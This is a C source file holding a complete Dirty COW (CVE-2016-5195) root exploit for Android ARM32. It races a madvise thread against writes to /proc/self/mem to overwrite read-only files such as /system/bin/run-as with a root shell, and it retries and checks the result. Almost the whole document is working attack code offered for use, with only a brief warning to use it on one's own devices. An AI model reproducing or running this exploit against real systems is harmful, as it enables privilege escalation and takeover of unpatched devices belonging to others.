/*
 * Dirty COW (CVE-2016-5195) - Android ARM32 root exploit
 * Based on the original PoC by Phil Oester
 *
 * This version overwrites /system/bin/run-as with a root shell.
 * After running, execute: /system/bin/run-as to get a root shell.
 * Then use that shell to install su properly.
 *
 * WARNING: Only use on your own devices for legitimate purposes.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sched.h>

struct target {
    void *map;
    off_t offset;
    const char *payload;
    size_t payload_len;
    int stop;
};

static void *madvise_thread(void *arg) {
    struct target *t = (struct target *)arg;
    while (!t->stop) {
        /* Tell the kernel to drop the private COW page */
        madvise(t->map, t->payload_len, MADV_DONTNEED);
        sched_yield();
    }
    return NULL;
}

static void *write_thread(void *arg) {
    struct target *t = (struct target *)arg;
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open /proc/self/mem");
        return NULL;
    }
    while (!t->stop) {
        lseek(fd, (off_t)((char *)t->map + t->offset), SEEK_SET);
        write(fd, t->payload, t->payload_len);
    }
    close(fd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <target_file> <payload_file>\n", argv[0]);
        fprintf(stderr, "  target_file:  file to overwrite (e.g., /system/bin/run-as)\n");
        fprintf(stderr, "  payload_file: replacement content\n");
        return 1;
    }

    const char *target_path = argv[1];
    const char *payload_path = argv[2];

    /* Read payload */
    int pfd = open(payload_path, O_RDONLY);
    if (pfd < 0) { perror("open payload"); return 1; }
    struct stat pst;
    fstat(pfd, &pst);
    char *payload = malloc(pst.st_size);
    read(pfd, payload, pst.st_size);
    close(pfd);

    /* Open target read-only */
    int fd = open(target_path, O_RDONLY);
    if (fd < 0) { perror("open target"); return 1; }
    struct stat st;
    fstat(fd, &st);

    if (pst.st_size > st.st_size) {
        fprintf(stderr, "ERROR: payload (%ld) larger than target (%ld)\n",
                (long)pst.st_size, (long)st.st_size);
        return 1;
    }

    printf("Target:  %s (%ld bytes)\n", target_path, (long)st.st_size);
    printf("Payload: %s (%ld bytes)\n", payload_path, (long)pst.st_size);

    /* Map target file read-only with MAP_PRIVATE (COW) */
    void *map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }
    close(fd);

    struct target t = {
        .map = map,
        .offset = 0,
        .payload = payload,
        .payload_len = pst.st_size,
        .stop = 0
    };

    int attempts = 5;
    int attempt;
    for (attempt = 1; attempt <= attempts; attempt++) {
        t.stop = 0;
        printf("Attempt %d/%d - Racing... (10 seconds)\n", attempt, attempts);

        pthread_t th1, th2;
        pthread_create(&th1, NULL, madvise_thread, &t);
        pthread_create(&th2, NULL, write_thread, &t);

        sleep(10);
        t.stop = 1;

        pthread_join(th1, NULL);
        pthread_join(th2, NULL);

        /* Verify by re-reading from disk (drop page cache first) */
        int vfd = open(target_path, O_RDONLY);
        char *verify = malloc(pst.st_size);
        read(vfd, verify, pst.st_size);
        close(vfd);

        if (memcmp(verify, payload, pst.st_size) == 0) {
            printf("SUCCESS! %s has been overwritten.\n", target_path);
            free(verify);
            break;
        } else {
            printf("Attempt %d failed. ", attempt);
            /* Show first differing byte */
            int i;
            for (i = 0; i < (int)pst.st_size; i++) {
                if (verify[i] != payload[i]) {
                    printf("First diff at byte %d: got 0x%02x want 0x%02x\n",
                           i, (unsigned char)verify[i], (unsigned char)payload[i]);
                    break;
                }
            }
            if (i == (int)pst.st_size) {
                printf("All bytes match on detailed check - SUCCESS!\n");
                free(verify);
                break;
            }
        }
        free(verify);
    }

    if (attempt > attempts) {
        printf("FAILED after %d attempts. Kernel may be patched.\n", attempts);
    }

    free(payload);
    munmap(map, st.st_size);
    return (attempt > attempts) ? 1 : 0;
}
